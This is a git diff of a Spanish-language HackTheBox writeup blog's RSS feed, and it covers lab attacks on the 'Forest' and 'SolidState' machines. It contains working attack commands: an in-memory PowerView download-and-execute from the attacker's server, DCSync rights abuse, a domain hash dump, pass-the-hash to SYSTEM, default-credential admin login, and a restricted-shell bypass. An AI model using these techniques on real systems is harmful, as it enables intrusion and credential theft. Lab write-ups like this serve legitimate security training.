+Account expires              Never
+
+Password last set            10/11/2023 3:29:16 PM
+Password expires             Never
+Password changeable          10/12/2023 3:29:16 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Exchange Windows Perm*Domain Users
+The command completed successfully.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora que estamos dentro este grupo podemos aprovecharnos del privilegio &lt;code&gt;WriteDacl&lt;/code&gt; y ejecutar un &lt;code&gt;Dcsync Attack&lt;/code&gt;, para ello ejecutamos los siguientes comandos.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; $SecPassword = ConvertTo-SecureString 'fmiracle123$!' -AsPlainText -Force
+Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; $Cred = New-Object System.Management.Automation.PSCredential('htb.local\fmiracle', $SecPassword)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Despues vamos a descargarnos e importar el modulo de &lt;code&gt;PowerView.ps1&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&quot;&gt;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.161 - - [11/Oct/2023 17:32:48] &quot;GET /PowerView.ps1 HTTP/1.1&quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; Iex(New-Object Net.WebClient).downloadString('http://10.10.16.10/PowerView.ps1')
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Finalmente ejecutamos la función &lt;code&gt;Add-DomainObjectAcl&lt;/code&gt; del &lt;code&gt;PowerView.ps1&lt;/code&gt; que importamos.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity &quot;DC=htb, DC=local&quot; -PrincipalIdentity fmiracle -Rights DCSync
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Y ahora en nuestro equipo podemos usar &lt;code&gt;secretdump&lt;/code&gt; usando las credenciales del usuario &lt;code&gt;fmiracle&lt;/code&gt; y podemos dumpearnos todos los hashes del dominio.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ secretsdump.py htb.local/fmiracle@10.10.10.161
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denid
+[*] Dumping Domain Credentials 
+[*] Using the DRSUAPI method to get NTDS.DIT secret
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Aplicamos &lt;code&gt;pass the hash&lt;/code&gt; con &lt;code&gt;psexec.py&lt;/code&gt; para conectarnos como el usuario &lt;code&gt;Administrator&lt;/code&gt;, nos dirigimos al directorio personal del usuario y podemos visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ psexec.py htb.local/Administrator@10.10.10.161 -hashes :32693b11e6aa90eb43d32c72a07ceea6
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on 10.10.10.161.....
+[*] Found writable share ADMIN$
+[*] Uploading file bUDVoWTk.exe
+[*] Opening SVCManager on 10.10.10.161.....
+[*] Creating service jeFE on 10.10.10.161.....
+[*] Starting service jeFE.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&amp;gt; whoami
+nt authority\system
+
+C:\Windows\system32&amp;gt; cd C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop&amp;gt; type root.txt
+84831d87fd5fe84052c8fb99dd4b9c5
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+        <pubDate>Wed, 11 Oct 2023 00:00:00 -0500</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Forest</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Forest</guid>
+        
+        <category>RPC Enumeration</category>
+        
+        <category>AS-RepRoast attack</category>
+        
+        <category>Cracking Hashes</category>
+        
+        <category>Abusing WinRM</category>
+        
+        <category>BloodHound Enumeration</category>
+        
+        <category>Gathering system information</category>
+        
+        <category>Abusing Account Operators Group</category>
+        
+        <category>Abusing WriteDacl</category>
+        
+        <category>DCSync Exploitation</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
     
       <item>
         <title>Maquina Joker - htb writeup</title>
@@ -553,7 +1136,7 @@ bash-4.3# cat root.txt
 &lt;/code&gt;&lt;/pre&gt;
 
 </description>
-        <pubDate>Fri, 25 Aug 2023 00:00:00 +0000</pubDate>
+        <pubDate>Fri, 25 Aug 2023 00:00:00 -0500</pubDate>
         <link>http://localhost:4000/hackthebox/htb-writeup-Joker</link>
         <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Joker</guid>
         
@@ -1158,7 +1741,7 @@ f55c47e3b749e8ae956f980fba1dc782
 &lt;/code&gt;&lt;/pre&gt;
 
 </description>
-        <pubDate>Thu, 10 Aug 2023 00:00:00 +0000</pubDate>
+        <pubDate>Thu, 10 Aug 2023 00:00:00 -0500</pubDate>
         <link>http://localhost:4000/hackthebox/htb-writeup-Atom</link>
         <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Atom</guid>
         
@@ -1561,7 +2144,7 @@ bash-4.3# cat root.txt
 5245239446324bb1fe4343385751f280
 &lt;/code&gt;&lt;/pre&gt;
 </description>
-        <pubDate>Mon, 07 Aug 2023 00:00:00 +0000</pubDate>
+        <pubDate>Mon, 07 Aug 2023 00:00:00 -0500</pubDate>
         <link>http://localhost:4000/hackthebox/htb-writeup-Europa</link>
         <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Europa</guid>
         
@@ -2603,7 +3186,7 @@ services:
 
 &lt;p&gt;Hasta la proxima! 😄😊.&lt;/p&gt;
 </description>
-        <pubDate>Sat, 22 Jul 2023 00:00:00 +0000</pubDate>
+        <pubDate>Sat, 22 Jul 2023 00:00:00 -0500</pubDate>
         <link>http://localhost:4000/articulos/Docker</link>
         <guid isPermaLink="true">http://localhost:4000/articulos/Docker</guid>
         
@@ -3056,7 +3639,7 @@ bash-5.0# cat root.txt
 26521e5fb779f8e62fa4d068175a3b5a
 &lt;/code&gt;&lt;/pre&gt;
 </description>
-        <pubDate>Wed, 19 Jul 2023 00:00:00 +0000</pubDate>
+        <pubDate>Wed, 19 Jul 2023 00:00:00 -0500</pubDate>
         <link>http://localhost:4000/hackthebox/htb-writeup-Inject</link>
         <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Inject</guid>
         
@@ -3874,7 +4457,7 @@ cat root.txt
 &lt;/code&gt;&lt;/pre&gt;
 
 </description>
-        <pubDate>Mon, 17 Jul 2023 00:00:00 +0000</pubDate>
+        <pubDate>Mon, 17 Jul 2023 00:00:00 -0500</pubDate>
         <link>http://localhost:4000/hackthebox/htb-writeup-Node</link>
         <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Node</guid>
         
@@ -4403,7 +4986,7 @@ root
 &lt;/code&gt;&lt;/pre&gt;
 
 </description>
-        <pubDate>Thu, 29 Jun 2023 00:00:00 +0000</pubDate>
+        <pubDate>Thu, 29 Jun 2023 00:00:00 -0500</pubDate>
         <link>http://localhost:4000/hackthebox/htb-writeup-Luanne</link>
         <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Luanne</guid>
         
@@ -4847,7 +5430,7 @@ C:\Documents and Settings\Administrator\Desktop&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
 
 </description>
-        <pubDate>Thu, 29 Jun 2023 00:00:00 +0000</pubDate>
+        <pubDate>Thu, 29 Jun 2023 00:00:00 -0500</pubDate>
         <link>http://localhost:4000/hackthebox/htb-writeup-Legacy</link>
         <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Legacy</guid>
         
@@ -5488,7 +6071,7 @@ firefart@Valentine:~# cat root.txt
 c3261195d6711ce3bfa9bc76bfc43e4e
 &lt;/code&gt;&lt;/pre&gt;
 </description>
-        <pubDate>Sat, 24 Jun 2023 00:00:00 +0000</pubDate>
+        <pubDate>Sat, 24 Jun 2023 00:00:00 -0500</pubDate>
         <link>http://localhost:4000/hackthebox/htb-writeup-Valentine</link>
         <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Valentine</guid>
         
@@ -5503,434 +6086,6 @@ c3261195d6711ce3bfa9bc76bfc43e4e
         <category>Linux Kernel Explotation</category>
         
         <category>Dirty Cow</category>
-        
-        
-        <category>hackthebox</category>
-        
-      </item>
-    
-      <item>
-        <title>Maquina SolidState - htb writeup</title>
-        <description>&lt;p&gt;Hola otra vez, el dia de hoy vamos a resolver la máquina &lt;code&gt;SolidState&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad media, la cual vamos a explotar al conectarnos a un servicio de administración que nos permitira cambiar las contraseñas de usuarios de correo, y mediante ello obtendremos unas credenciales para conectarnos al sistema, donde una vez conectados haremos un bypass de una &lt;code&gt;restricted bash&lt;/code&gt; asignada y finalmente nos construiremos un script en bash para detectar tareas &lt;code&gt;cron&lt;/code&gt; y aprovecharemos una para poder convertinos en el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir SolidState
-❯ ls
- SolidState
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
-mkt () {
-	mkdir {nmap,content,exploits,scripts}
-}
-❯ mkt
-❯ ls
- content   exploits   nmap   scripts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.51
-PING 10.10.10.51 (10.10.10.51) 56(84) bytes of data.
-64 bytes from 10.10.10.51: icmp_seq=1 ttl=63 time=195 ms
-
---- 10.10.10.51 ping statistics ---
-1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 194.687/194.687/194.687/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt;correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.51 -oG openPorts
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-24 21:26 GMT
-Initiating SYN Stealth Scan at 21:26
-Scanning 10.10.10.51 [65535 ports]
-Discovered open port 25/tcp on 10.10.10.51
-Discovered open port 110/tcp on 10.10.10.51
-Discovered open port 80/tcp on 10.10.10.51
-Discovered open port 22/tcp on 10.10.10.51
-Discovered open port 4555/tcp on 10.10.10.51
-Discovered open port 119/tcp on 10.10.10.51
-Completed SYN Stealth Scan at 21:26, 18.27s elapsed (65535 total ports)
-Nmap scan report for 10.10.10.51
-Host is up, received user-set (0.21s latency).
-Scanned at 2023-06-24 21:26:16 GMT for 18s
-Not shown: 65529 closed tcp ports (reset)
-PORT     STATE SERVICE REASON
-22/tcp   open  ssh     syn-ack ttl 63
-25/tcp   open  smtp    syn-ack ttl 63
-80/tcp   open  http    syn-ack ttl 63
-110/tcp  open  pop3    syn-ack ttl 63
-119/tcp  open  nntp    syn-ack ttl 63
-4555/tcp open  rsip    syn-ack ttl 63
-
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 18.41 seconds
-           Raw packets sent: 86905 (3.824MB) | Rcvd: 85777 (3.431MB)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,25,80,110,119,4555 10.10.10.51 -oN targeted
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-24 21:27 GMT
-Nmap scan report for 10.10.10.51
-Host is up (0.45s latency).
-
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
-|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
-|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
-25/tcp   open  smtp    JAMES smtpd 2.3.2
-|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.5 [10.10.16.5])
-80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
-|_http-title: Home - Solid State Security
-|_http-server-header: Apache/2.4.25 (Debian)
-110/tcp  open  pop3    JAMES pop3d 2.3.2
-119/tcp  open  nntp    JAMES nntpd (posting ok)
-4555/tcp open  rsip?
-| fingerprint-strings: 
-|   GenericLines: 
-|     JAMES Remote Administration Tool 2.3.2
-|     Please enter your login and password
-|     Login id:
-|     Password:
-|     Login failed for 
-|_    Login id:
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port4555-TCP:V=7.92%I=7%D=6/24%Time=64975FD6%P=x86_64-pc-linux-gnu%r(Ge
-SF:nericLines,7C,&quot;JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\nPl
-SF:ease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPasswo
-SF:rd:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n&quot;);
-Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 291.45 seconds
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Puerto&lt;/th&gt;
-      &lt;th&gt;Servicio&lt;/th&gt;
-      &lt;th&gt;Versión&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;22&lt;/td&gt;
-      &lt;td&gt;SSH&lt;/td&gt;
-      &lt;td&gt;OpenSSH 7.4p1 Debian 10+deb9u1&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;25&lt;/td&gt;
-      &lt;td&gt;SMTP&lt;/td&gt;
-      &lt;td&gt;JAMES smtpd 2.3.2&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;80&lt;/td&gt;
-      &lt;td&gt;HTTP&lt;/td&gt;
-      &lt;td&gt;Apache httpd 2.4.25&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;110&lt;/td&gt;
-      &lt;td&gt;POP3&lt;/td&gt;
-      &lt;td&gt;JAMES pop3d 2.3.2&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;119&lt;/td&gt;
-      &lt;td&gt;NNTP&lt;/td&gt;
-      &lt;td&gt;JAMES nntpd (posting ok)&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;4555&lt;/td&gt;
-      &lt;td&gt;RSIP?&lt;/td&gt;
-      &lt;td&gt;JAMES Remote Administration Tool 2.3.2&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Ya que nmap nos reporta el el puerto 4555 un servicio de administración, vamos a tratar de conectarnos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nc 10.10.10.51 4555
-JAMES Remote Administration Tool 2.3.2
-Please enter your login and password
-Login id:
-admin
-Password:
-password
-Login failed for admin
-Login id:
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Obvervamos que el servicio nos pide unas credenciales, y si fallamos al tratar de conectarnos, pero podemos probar credenciales por defecto, en este caso usaremos &lt;code&gt;root:root&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nc 10.10.10.51 4555
-JAMES Remote Administration Tool 2.3.2
-Please enter your login and password
-Login id:
-root
-Password:
-root
-Welcome root. HELP for a list of commands
-HELP
-Currently implemented commands:
-help                                    display this help
-listusers                               display existing accounts
-countusers                              display the number of existing accounts
-adduser [username] [password]           add a new user
-verify [username]                       verify if specified user exist
-deluser [username]                      delete existing user
-setpassword [username] [password]       sets a user's password
-setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
-showalias [username]                    shows a user's current email alias
-unsetalias [user]                       unsets an alias for 'user'
-setforwarding [username] [emailaddress] forwards a user's email to another email address
-showforwarding [username]               shows a user's current email forwarding
-unsetforwarding [username]              removes a forward
-user [repositoryname]                   change to another user repository
-shutdown                                kills the current JVM (convenient when James is run as a daemon)
-quit                                    close connection
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Logramos ingresar al servicio, y podemos ver que tenemos una lista de opciones que podemos usar, entre ellas una que corresponde a listar usuario y cambiarles la contraseña.&lt;/p&gt;
-
-&lt;p&gt;Primero vamos a lista a todos los usuarios registrados.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;listusers
-Existing accounts 5
-user: james
-user: thomas
-user: john
-user: mindy
-user: mailadmin
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Ahora como no sabemos la contraseña de cada uno de estos, usaremos la opcion para modificarles la contraseña y le asignaremos a todos el mismo nombre de usuario.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;setpassword james james
-Password for james reset
-setpassword thomas thomas
-Password for thomas reset
-setpassword john john
-Password for john reset
-setpassword mindy mindy
-Password for mindy reset
-setpassword mailadmin mailadmin
-Password for mailadmin reset
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como los usuarios corresponden a servicios de correo, vamos a conectarnos para inspeccionar si existe algun mail importante.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ telnet 10.10.10.51 110
-Trying 10.10.10.51...
-Connected to 10.10.10.51.
-Escape character is '^]'.
-+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
-USER james
-+OK
-PASS james
-+OK Welcome james
-LIST
-+OK 0 0
-.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si ahora probamos a conectarnos como el usuario &lt;code&gt;mindy&lt;/code&gt;, observamos que tiene dos correos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ telnet 10.10.10.51 110
-Trying 10.10.10.51...
-Connected to 10.10.10.51.
-Escape character is '^]'.
-+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
-USER mindy
-+OK
-PASS mindy
-+OK Welcome mindy
-LIST
-+OK 2 1945
-1 1109
-2 836
-.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Al leer el segundo correo, encontramos unas credenciales para conectarse por &lt;code&gt;ssh&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;RETR 2
-+OK Message follows
-Return-Path: &amp;lt;mailadmin@localhost&amp;gt;
-Message-ID: &amp;lt;16744123.2.1503422270399.JavaMail.root@solidstate&amp;gt;
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Delivered-To: mindy@localhost
-Received: from 192.168.11.142 ([192.168.11.142])
-          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
-          for &amp;lt;mindy@localhost&amp;gt;;
-          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
-Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
-From: mailadmin@localhost
-Subject: Your Access
-
-Dear Mindy,
-
-
-Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
-Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 
-
-username: mindy
-pass: P@55W0rd1!2@
-
-Respectfully,
-James
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Las credenciales son validas, pero al conectarnos vemos que estamos limitados por una restricted bash.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ssh mindy@10.10.10.51
-The authenticity of host '10.10.10.51 (10.10.10.51)' can't be established.
-ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.10.51' (ECDSA) to the list of known hosts.
-mindy@10.10.10.51's password: 
-Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
-mindy@solidstate:~$ 
-mindy@solidstate:~$ whoami
--rbash: whoami: command not found
-mindy@solidstate:~$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora como podemos bypasear la &lt;code&gt;restricted bash&lt;/code&gt;, pues es muy sencillo; podemos usar como parametro &lt;code&gt;-t bash&lt;/code&gt; y de ejecutarse un docker en la maquina nos otorgara una sesión interactiva dentro del contenedor omitiendo las restricciones.&lt;/p&gt;
-
-&lt;p&gt;Haciendo uso de lo mencionado, podemos volver a conectarnos y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ssh mindy@10.10.10.51 -t bash
-mindy@10.10.10.51's password: 
-${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 
-${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
-mindy
-${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls
-bin  user.txt
-${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat user.txt 
-5aadb8206e94c4471346a863bf006a4a
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Enumarando el sistema no encontramos información interesante como archivos suid o privilegios de nuestro usuario. Por ello vamos a crearnos un &lt;code&gt;script&lt;/code&gt; en bash que nos permita ver tareas que se esten ejecutando en el sistema a intevalos regulares de tiempo al que llamaremos &lt;code&gt;procmon.sh&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/bash
-
-old_process=$(ps -eo user,command)
-
-while true; do
-  new_process=$(ps -eo user,command)
-  diff &amp;lt;(echo &quot;$old_process&quot;) &amp;lt;(echo &quot;$new_process&quot;) | grep &quot;[\&amp;gt;\&amp;lt;]&quot; | grep -vE &quot;kworker|procmon|command&quot;
-  old_process=$new_process
-done
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ejecutamos el script y despues de unos minutos vemos que el usuario &lt;code&gt;root&lt;/code&gt; esta ejecutando un script &lt;code&gt;tmp.py&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ./procmon.sh 
-&amp;gt; root     /usr/sbin/CRON -f
-&amp;lt; root     /usr/sbin/CRON -f
-c^C
-${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ ls
-${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ cd /dev/shm
-${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ nano procmon.sh
-${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ chmod +x procmon.sh 
